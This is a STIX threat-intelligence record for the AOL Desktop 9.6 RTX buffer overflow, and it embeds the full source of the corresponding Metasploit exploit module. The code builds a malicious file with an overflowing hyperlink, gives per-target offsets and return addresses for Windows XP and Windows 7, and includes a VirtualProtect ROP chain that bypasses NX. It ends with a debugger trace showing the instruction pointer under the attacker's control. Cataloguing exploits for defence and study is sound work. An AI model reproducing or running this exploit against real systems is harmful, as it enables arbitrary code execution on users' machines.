{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ced2b061-3c52-4a2d-90ee-3b53d2d17306",
    "created": "2024-08-14T16:37:05.558026Z",
    "modified": "2024-08-14T16:37:05.55803Z",
    "name": "\"AOL Desktop 9.6 RTX Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in AOL Desktop 9.6's Tool\\rich.rct component. By supplying a long string of data in the hyperlink tag, rich.rct copies this data into a buffer using a strcpy function, which causes an overflow, and results arbitrary code execution.  'License'\t     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/aol_desktop_linktag.rb",
            "external_id": "aol_desktop_linktag.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"AOL Desktop 9.6 RTX Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in AOL Desktop 9.6's Tool\\rich.rct\n        component. By supplying a long string of data in the hyperlink tag, rich.rct copies\n        this data into a buffer using a strcpy function, which causes an overflow, and\n        results arbitrary code execution.\n      },\n      'License'\t     => MSF_LICENSE,\n      'Author'         =>\n        [\n          'sup3r',        #Initial disclosure, poc (9.5)\n          'sickn3ss',     #9.6 poc\n          'sinn3r',       #Metasploit\n          'mr_me <steventhomasseeley[at]gmail.com>',  #NX bypass target\n          'silent_dream', #Win 7 target\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '70741'],\n          [ 'EDB', '16085' ],\n        ],\n      'Payload'\t     =>\n        {\n          'Space'           => 400,\n          'BadChars'        => \"\\x00\\x0d\\x0a\\x3e\\x7f\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"process\",\n        },\n      'Platform'       => 'win',\n      'Targets'\t     =>\n        [\n          [\n            'AOL Desktop 9.6 on Windows XP SP3',\n            {\n              'Ret'   => 0x01DB4542,  #0x01DB4542 JMP ESI\n              'Offset'=> 5391,        #Offset to EIP\n              'Max'   => 8000,        #Buffer max. Can be more.\n            },\n          ],\n          [\n            'AOL Desktop 9.6 on Windows XP SP3 - NX bypass',\n            {\n              'Ret'    => 0x6C02D216,  # PUSH ESI, POP ESP, POP ESI, POP EDI, POP EDI, RETN 8\n              'vp'     => 0x7C801AD4,  # (kernel32.dll) => VirtualProtect()\n              'Offset' => 5368,        # offset to rop\n              'Max'    => 8000,        # Buffer max. Can be more.\n            },\n          ],\n          [\n            'AOL Desktop 9.6 on Windows 7',\n            {\n              'Ret'    => 0x63227D6D,  # JMP ESP in coolapi.dll\n              'Offset' => 4327,        # Offset to EIP\n              'Max'    => 8000,        # Buffer max. Can be more\n            }\n          ],\n        ],\n      'Privileged'\t => false,\n      'DisclosureDate' => '2011-01-31',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new( 'FILENAME', [false, 'The filename', 'msf.rtx'] ),\n        ]\n      )\n  end\n\n\n  def exploit\n\n    if target.name =~ /XP SP3$/\n\n      # Compatible with what the poc has, and what I see on my debugger\n      sploit  = ''\n      sploit << rand_text_alpha(4968+7)\n      sploit << payload.encoded\n      sploit << rand_text_alpha(5368-sploit.length)\n      sploit << make_nops(11)\n      sploit << \"\\xe9\\x70\\xfe\\xff\\xff\"  #JMP back 400 bytes\n      sploit << [target.ret].pack('V')\n      sploit << make_nops(target['Offset']-sploit.length-2)\n      sploit << \"\\xeb\\x04\"\n      sploit << [target.ret].pack('V')\n      sploit << payload.encoded\n      sploit << rand_text_alpha(target['Max']-sploit.length)\n\n    elsif target.name =~ /SP3 - NX bypass$/\n\n      #Thanks mr_me for the ROP chain\n\n      rop = ''\n      # This is the start of ESI\n      rop << rand_text_alpha(4) # junk - > POP ESI\n      rop << rand_text_alpha(4) # junk - > POP EDI\n      rop << rand_text_alpha(4) # junk - > POP EDI\n      rop << \"\\x66\\x21\\x5c\\x63\" # 0x635C2166 (appdata.dll) => POP ECX; RETN\n\n      # Take control of the stack pointer right here (EIP)\n      rop << [target.ret].pack('V') # junk - > RET 8 on the EIP pointer\n      rop << rand_text_alpha(4) # junk - > RET 8 on the EIP pointer\n\n      # Arg 4 of VirtualProtect() -> lpflOldProtect\n      rop << \"\\x4c\\x4b\\x0e\\x69\" # 0x690E4B4C => RW addr -----------^^\n\n      # Arg 2 of VirtualProtect() -> dwsize (0x212C) & setup EAX\n      rop << \"\\xf3\\xdf\\x4b\\x67\" # 0x674BDFF3 (mip.tol) => XCHG EAX,EBX; RETN\n      rop << \"\\xfd\\xc6\\xb0\\x6b\" # 0x6BB0C6FD (imfdecode.rct) => MOV EAX,212C; POP EBX; RETN\n      rop << rand_text_alpha(4) # junk -------------------------------------------^^\n      rop << \"\\xf3\\xdf\\x4b\\x67\" # 0x674BDFF3 (mip.tol) => XCHG EAX,EBX; RETN\n\n      # Arg 3 of VirtualProtect() -> lpflOldProtectflNewProtect (PAGE_EXECUTE_READWRITE)\n      rop << \"\\xbb\\x07\\x98\\x64\" # 0x649807BB (abook.dll) => XCHG EAX,EDX; RETN\n      rop << \"\\x9e\\xe4\\xc6\\x68\" # 0x68C6E49E (www.tol) ======> ADD EAX,10; POP EBP; RETN 4\n      rop << rand_text_alpha(4) # junk --------------------------------------^^\n      rop << \"\\xbb\\x07\\x98\\x64\" # 0x649807BB (ebook.dll) => XCHG EAX,EDX; RETN\n      rop << rand_text_alpha(4) # junk ----------------------------------------------^^\n\n      # Arg 1 of VirtualProtect() -> return address & lpAddress\n      # Also, setup call to VirtualProtect() ptr in ESI\n      rop << \"\\x3f\\x7b\\x1e\\x67\" # 0x671E7B3F (manager.dll) => PUSH ESP; POP EBP; RETN\n      rop << \"\\x2c\\x10\\x49\\x67\" # 0x674BDFF3 (mip.tol) => XCHG EAX,EBP; RETN\n      rop << \"\\x2d\\x95\\x1d\\x67\" # 0x671D952D (mip.tol) => ADD EAX,0C; POP ESI; RETN\n      rop << rand_text_alpha(4) # junk ---------------------------------^^\n      rop << \"\\x2d\\x95\\x1d\\x67\" # 0x671D952D (mip.tol) => ADD EAX,0C; POP ESI; RETN\n      rop << rand_text_alpha(4) # junk ---------------------------------^^\n      rop << \"\\x2d\\x95\\x1d\\x67\" # 0x671D952D (mip.tol) => ADD EAX,0C; POP ESI; RETN\n      rop << rand_text_alpha(4) # junk ---------------------------------^^\n      rop << \"\\x2d\\x95\\x1d\\x67\" # 0x671D952D (mip.tol) => ADD EAX,0C; POP ESI; RETN\n      rop << rand_text_alpha(4) # junk ---------------------------------^^\n      rop << \"\\x2d\\x95\\x1d\\x67\" # 0x671D952D (mip.tol) ===========> ADD EAX,0C; POP ESI; RETN\n      rop << [target['vp']].pack('V') # VirtualProtect() ----------------------------^^\n      rop << \"\\x2c\\x10\\x49\\x67\" # 0x6749102C (mip.tol) => XCHG EAX,EBP; RETN\n\n      # Continue safely, rop nop\n      rop << \"\\xdb\\x22\\x94\\x64\" # 0x649422DB (manager.dll) ======> POP EDI; RETN\n      rop << \"\\xdc\\x22\\x94\\x64\" # 0x649422DC (abook.dll) => RETN ----^^\n\n      # gently place our code on the stack\n      rop << \"\\x7e\\x38\\xa0\\x60\" # 0x60A0387E (abook.dll) ===> PUSHAD; RETN\n\n      sploit = rand_text_alpha(target['Offset']-602) #688 was the original\n\n      #mr_me's offset\n      sploit << rop\n      sploit << make_nops(74)\n      sploit << payload.encoded\n\n      #padding to the next offset\n      sploit << rand_text_alpha(7)\n\n      #the next offset\n      sploit << rop\n      sploit << make_nops(74)\n      sploit << payload.encoded\n\n      #Padding\n      sploit << rand_text_alpha(target['Max']-sploit.length)\n\n    elsif target.name =~ /Windows 7/\n\n      #Thanks silent_dream\n\n      sploit  = ''\n      sploit << rand_text_alpha(target['Offset']-2-14)\n      sploit << \"\\xeb\\x13\"\n      sploit << make_nops(14)\n      sploit << [target.ret].pack('V')\n      sploit << make_nops(15)\n      sploit << payload.encoded\n      sploit << rand_text_alpha(target['Max'] - sploit.length)\n\n    end\n\n    link_value = rand_text_alpha(6)\n\n    rtx  = \"<HTML>\"\n    rtx << \"<A HREF=\\\"#{sploit}\\\">#{link_value}</A>\"\n    rtx << \"</HTML>\"\n\n    print_status(\"Creating #{datastore['FILENAME']}...\")\n    file_create(rtx)\n  end\nend\n\n=begin\n0:000> g\nBreakpoint 0 hit\neax=00000006 ebx=06652370 ecx=02d9c898 edx=038d0000 esi=00000000 edi=02d99b30\neip=6909e187 esp=0022e638 ebp=0022e648 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206\nrich!ToolInit+0xed2c:\n6909e187 e85cd50300      call    rich!ToolInit+0x4c28d (690db6e8)\n0:000> g\n(8d8.924): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=02d38358 ecx=00000000 edx=00000030 esi=02d53cb8 edi=0022e7c4\neip=43434343 esp=0022e760 ebp=0022e780 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202\n43434343 ??              ???\n0:000> dd esi\n02d53cb8  43434343 43434343 43434343 43434343\n02d53cc8  43434343 43434343 43434343 43434343\n02d53cd8  43434343 43434343 43434343 43434343\n02d53ce8  43434343 43434343 43434343 43434343\n02d53cf8  43434343 43434343 43434343 43434343\n02d53d08  43434343 43434343 43434343 43434343\n02d53d18  43434343 43434343 43434343 43434343\n02d53d28  43434343 43434343 43434343 43434343\n=end\n",
    "x_mitre_disclosure_date": "2011-01-31",
    "x_mitre_platforms": [
        "win'"
    ]
}